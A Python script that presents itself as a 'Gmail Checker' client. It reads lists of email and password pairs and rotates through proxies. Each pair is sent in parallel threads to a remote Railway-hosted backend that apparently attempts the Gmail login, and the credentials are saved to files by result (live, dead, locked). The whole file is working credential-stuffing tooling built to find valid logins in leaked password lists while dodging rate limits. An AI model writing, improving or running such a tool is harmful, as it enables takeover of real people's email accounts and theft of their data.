import requests
import threading
import time
import random
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# ═══════════════════════════════════════════
#  Gmail Checker Client (Railway Backend)
# ═══════════════════════════════════════════

# Đổi URL này sau khi deploy lên Railway
RAILWAY_URL = "https://test111-production.up.railway.app/check"

MAX_THREADS = 5     # Tùy chỉnh (Railway server mạnh hơn máy cá nhân)
TIMEOUT = 70        # Playwright cần thời gian load (Server timeout 60s + buffer)

# Lock cho file output
file_lock = threading.Lock()

stats = {"live": 0, "dead": 0, "locked": 0, "error": 0, "total": 0}

class Color:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    GRAY = "\033[90m"
    BOLD = "\033[1m"
    END = "\033[0m"

def banner():
    print(f"""
{Color.CYAN}{Color.BOLD}
 ██████╗ ███╗   ███╗ █████╗ ██╗██╗     
██╔════╝ ████╗ ████║██╔══██╗██║██║     
██║  ███╗██╔████╔██║███████║██║██║     
██║   ██║██║╚██╔╝██║██╔══██║██║██║     
╚██████╔╝██║ ╚═╝ ██║██║  ██║██║███████╗
 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
  Gmail Checker Client (Railway)
{Color.END}{Color.GRAY}{'='*45}{Color.END}
""")

def load_proxies(filepath="proxies.txt"):
    proxies = []
    if os.path.exists(filepath):
        with open(filepath, "r") as f:
            for line in f:
                line = line.strip()
                if line and ":" in line:
                    if not line.startswith("http"):
                        line = f"http://{line}"
                    proxies.append(line)
        print(f"{Color.GREEN}[+] Loaded {len(proxies)} proxies{Color.END}")
    else:
        print(f"{Color.YELLOW}[!] No proxies.txt found - sending without proxy{Color.END}")
    return proxies

def load_accounts(filepath):
    accounts = []
    if not os.path.exists(filepath):
        print(f"{Color.RED}[!] File not found: {filepath}{Color.END}")
        return accounts
    with open(filepath, "r") as f:
        for line in f:
            line = line.strip()
            if not line: continue
            sep = "|" if "|" in line else ":"
            parts = line.split(sep, 1)
            if len(parts) == 2:
                accounts.append((parts[0].strip(), parts[1].strip()))
    return accounts

def check_account_railway(email, password, proxy=None):
    payload = {
        "email": email,
        "password": password,
        "proxy": proxy
    }
    
    try:
        response = requests.post(RAILWAY_URL, json=payload, timeout=TIMEOUT)
        
        if response.status_code == 200:
            data = response.json()
            return data.get("status", "ERROR"), data.get("message", "No message")
        else:
            return "ERROR", f"HTTP {response.status_code}"
            
    except Exception as e:
        return "ERROR", str(e)[:50]

def save_result(filename, line):
    with file_lock:
        with open(filename, "a") as f:
            f.write(line + "\n")

def worker(account, index, proxies):
    email, password = account
    
    # Random proxy
    proxy = random.choice(proxies) if proxies else None
    
    status, message = check_account_railway(email, password, proxy)

    color_map = {
        "LIVE": Color.GREEN,
        "DEAD": Color.RED,
        "LOCKED": Color.YELLOW,
        "ERROR": Color.GRAY,
    }
    color = color_map.get(status, Color.GRAY)
    
    idx = index + 1
    total = stats["total"]
    print(f"  [{idx:>3}/{total}] {color}[{status:^7}]{Color.END} {email} → {message}")

    status_lower = status.lower()
    save_result(f"results_{status_lower}.txt", f"{email}:{password}")
    stats[status_lower] = stats.get(status_lower, 0) + 1

    return status

def main():
    banner()
    
    global RAILWAY_URL
    print(f"Server: {Color.CYAN}{RAILWAY_URL}{Color.END}")
    change = input("Change URL? (y/n): ").strip().lower()
    if change == 'y':
        RAILWAY_URL = input("Enter new Railway URL: ").strip()

    filepath = input(f"{Color.YELLOW}Enter file path (default: accounts.txt): {Color.END}").strip()
    if not filepath: filepath = "accounts.txt"
    
    accounts = load_accounts(filepath)
    if not accounts: return
    print(f"{Color.GREEN}[+] Loaded {len(accounts)} accounts{Color.END}")
    
    proxies = load_proxies()

    stats["total"] = len(accounts)
    print(f"\n{Color.CYAN}[*] Sending requests to Railway...{Color.END}\n")
    
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {
            executor.submit(worker, acc, i, proxies): acc
            for i, acc in enumerate(accounts)
        }
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"{Color.RED}[!] Error: {e}{Color.END}")

    elapsed = time.time() - start_time
    print(f"\n{Color.GRAY}{'='*45}{Color.END}")
    print(f"  {Color.GREEN}✓ Live:   {stats['live']}{Color.END}")
    print(f"  {Color.RED}✗ Dead:   {stats['dead']}{Color.END}")
    print(f"  {Color.YELLOW}⚠ Locked: {stats['locked']}{Color.END}")
    print(f"  {Color.GRAY}✦ Error:  {stats['error']}{Color.END}")
    print(f"  {Color.CYAN}⏱ Time:   {elapsed:.1f}s{Color.END}")
    print(f"{Color.GRAY}{'='*45}{Color.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
